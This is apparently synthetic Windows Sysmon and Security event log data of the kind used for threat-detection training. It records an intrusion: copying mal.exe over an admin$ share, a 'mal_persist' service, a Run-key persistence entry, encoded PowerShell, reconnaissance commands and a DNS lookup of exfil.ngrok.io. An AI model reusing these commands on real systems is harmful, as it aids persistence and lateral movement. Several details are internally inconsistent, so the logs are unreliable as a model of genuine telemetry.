<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>13</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:32:33.0000000Z" /><EventRecordID>1453</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:32:33.0000000Z</Data><Data Name="EventType">SetValue</Data><Data Name="ProcessId">40646</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath</Data><Data Name="Details">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:33:03.0000000Z" /><EventRecordID>1454</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6778-2039-1806-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">14816</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4719</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:33:30.0000000Z" /><EventRecordID>1455</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="CategoryId">%%8273</Data><Data Name="SubcategoryId">%%13312</Data><Data Name="SubcategoryGuid">{0CCE922B-69AE-11D9-BED3-505054503030}</Data><Data Name="AuditPolicyChanges">%%8448</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:00.0000000Z" /><EventRecordID>1456</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:34:00.0000000Z</Data><Data Name="ProcessId">25502</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetFilename">C:\Users\Public\Documents\exfil.zip</Data><Data Name="CreationUtcTime">2024-11-25T15:34:00.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:02.0000000Z" /><EventRecordID>1457</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xd14f</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x96c</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:08.0000000Z" /><EventRecordID>1458</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5638-5939-1397-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">42413</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:13.0000000Z" /><EventRecordID>1459</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5423-2391-2253-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">34087</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:37.0000000Z" /><EventRecordID>1460</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7408-4183-6114-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">28886</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:52.0000000Z" /><EventRecordID>1461</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:34:52.0000000Z</Data><Data Name="EventType">CreateKey</Data><Data Name="ProcessId">7532</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\mal_persist\ImagePath</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:34:56.0000000Z" /><EventRecordID>1462</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">.</Data><Data Name="SubjectLogonId">0x7df5fa</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:35:06.0000000Z" /><EventRecordID>1463</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-9736-9300-5007-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">2152</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:35:29.0000000Z" /><EventRecordID>1464</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:35:29.0000000Z</Data><Data Name="ProcessId">8097</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TargetFilename">C:\Users\alice\Downloads\invoice_scan.pdf.exe</Data><Data Name="CreationUtcTime">2024-11-25T15:35:29.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:35:42.0000000Z" /><EventRecordID>1465</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::10.0.0.5</Data><Data Name="Status">0x18</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:35:47.0000000Z" /><EventRecordID>1466</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x286b</Data><Data Name="NewProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="ParentProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x9f9</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:35:50.0000000Z" /><EventRecordID>1467</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">27447</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:36:15.0000000Z" /><EventRecordID>1468</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:36:15.0000000Z</Data><Data Name="ProcessGuid">{123B1-A819-F9EF-C687}</Data><Data Name="ProcessId">49530</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="User">.\svc_backup</Data><Data Name="ParentProcessId">2567</Data><Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data><Data Name="ParentCommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\temp\run.ps1</Data><Data Name="Hashes">MD5=52164a529e2562b0944fb8901e604699,SHA256=7ca1126867e615dfd9266d01d924a5444fe1bdb03fb78f35612a4ac19411fa8f</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:36:26.0000000Z" /><EventRecordID>1469</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:36:26.0000000Z</Data><Data Name="ProcessId">63880</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="QueryName">exfil.ngrok.io</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">192.168.1.200</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:36:56.0000000Z" /><EventRecordID>1470</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x7cfa</Data><Data Name="NewProcessName">C:\Windows\System32\net.exe</Data><Data Name="CommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xc30</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:37:13.0000000Z" /><EventRecordID>1471</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2990-3722-4233-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">58023</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:37:18.0000000Z" /><EventRecordID>1472</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-9963-7850-7543-1001</Data><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">20471</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">SRV-WEB01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4728</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:37:56.0000000Z" /><EventRecordID>1473</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="MemberSid">S-1-5-21-6281-7088-3718-3318</Data><Data Name="MemberName">CN=svc_sql,DC=contoso,DC=com</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="GroupName">Administrators</Data><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">.</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:00.0000000Z" /><EventRecordID>1474</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="ServiceName">mal_persist</Data><Data Name="ImagePath">C:\Windows\System32\net.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:02.0000000Z" /><EventRecordID>1475</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">.</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="TargetServerName">WKSTN-ALICE</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:06.0000000Z" /><EventRecordID>1476</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">alice</Data><Data Name="Workstation">DC02</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4719</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:10.0000000Z" /><EventRecordID>1477</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="CategoryId">%%8273</Data><Data Name="SubcategoryId">%%13312</Data><Data Name="SubcategoryGuid">{0CCE922B-69AE-11D9-BED3-505054503030}</Data><Data Name="AuditPolicyChanges">%%8448</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:31.0000000Z" /><EventRecordID>1478</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T15:39:31.0000000Z</Data><Data Name="ProcessGuid">{14559-9ACA-D7AE-16904}</Data><Data Name="ProcessId">1925</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data><Data Name="User">CONTOSO\bob</Data><Data Name="ParentProcessId">4598</Data><Data Name="ParentImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ParentCommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="Hashes">MD5=43f61cd230c458e9645a3bde2d31196d,SHA256=41b89f9577ebb4ba36a7454eb1b8055e1b4bdf9f726159c44b983c67c9cd2eef</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:33.0000000Z" /><EventRecordID>1479</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="SubjectLogonId">0xa7b732</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:38.0000000Z" /><EventRecordID>1480</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">37964</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:39:57.0000000Z" /><EventRecordID>1481</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5542-8756-4429-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">1199</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:40:04.0000000Z" /><EventRecordID>1482</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">SRV-FILE01</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:40:26.0000000Z" /><EventRecordID>1483</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8728-6359-5957-1001</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">50831</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:40:30.0000000Z" /><EventRecordID>1484</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0xc4cc72</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T15:40:32.0000000Z" /><EventRecordID>1485</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="Workstation">LAPTOP-MGMT</Data><Data Name="Status">0xC000006A</Data></EventData></Event>
